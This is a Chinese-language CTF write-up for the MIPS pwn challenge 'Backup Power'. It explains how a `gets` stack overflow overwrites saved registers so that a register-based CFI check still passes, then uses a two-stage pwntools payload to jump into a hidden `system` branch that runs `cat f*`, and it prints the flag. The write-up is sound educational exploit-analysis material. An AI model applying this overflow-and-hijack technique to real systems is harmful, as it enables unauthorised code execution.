# Backup Power

## 题目简述

附件是静态链接、无 PIE 的 MIPS32 大端程序。开发者入口 `develper_power_management_portal` 对 4 字节栈缓冲区调用 `gets`，但返回前会检查栈上的保存返回地址是否等于参数 `cfi=a*b+c`。主循环还会把 `$s1` 到 `$s7` 写回变量，使寄存器溢出结果跨轮次持久化。目标是在通过这项简易 CFI 的同时跳到正常输入无法触发的 `system` 分支。

## 解题过程

初始状态为 $a=b=0x800$、$c=0xb0c$，所以第一轮检查值是：

$$
a\times b+c=0x800\times0x800+0xb0c=0x400b0c.
$$

这个值恰好也是正常 `jal` 调用后应返回的位置。栈溢出不仅覆盖保存的 `$ra`，还覆盖函数尾声恢复的 `$s1` 到 `$s7`。返回主函数后，程序把这些寄存器分别存回 `a`、`b`、`c` 和四个命令参数。因此第一轮不能立即跳到目标，而应保留 `$ra=0x400b0c` 通过当前 CFI，同时把下一轮状态改成：

```text
a = 0x800
b = 0x800
c = 0xd48
arg1 = "cat"
arg2 = "f*"
arg3 = ""
arg4 = ""
```

新状态满足 $a\times b+c=0x400d48$，而 `0x400d48` 正是隐藏 `system` 分支的入口。第二次登录 `devolper` 时，主函数先用持久化后的数值计算 CFI；此时用同样布局溢出，把保存返回地址改为 `0x400d48`，检查仍然成立，函数随后直接返回到拼接并执行命令的位置。

```python
from pwn import p32

def stage(return_address):
    return b"AAAA" + b"BBBB" + b"CCCC" + b"".join([
        p32(0x800, endian="big"),
        p32(0x800, endian="big"),
        p32(0xD48, endian="big"),
        b"cat\0",
        b"f*\0\0",
        b"\0" * 4,
        b"\0" * 4,
        b"AAAA",
        p32(return_address, endian="big"),
    ])

payload1 = stage(0x400B0C)  # 通过初始 CFI，并持久化新寄存器
payload2 = stage(0x400D48)  # 通过新 CFI，跳入 system 分支
```

按顺序完成两次开发者登录并发送两段 payload 后，分支拼出 `cat f*`，输出：

```text
uiuctf{backup_p0wer_not_r3gisters}
```

## 方法总结

- CFI 值本身由可跨轮次改写的寄存器状态计算，因此不是不可伪造的完整性依据；第一阶段先塑造下一轮检查值，第二阶段再劫持控制流。
- MIPS 调用约定中的保存寄存器是这条利用链的数据通道。分析时要同时跟踪函数尾声的恢复偏移和调用者返回后的 `sw`，不能只盯着 `$ra`。
- 目标程序是大端架构，地址必须用大端序打包；每一阶段都应先验证 $a\times b+c$ 与当轮返回地址完全一致。
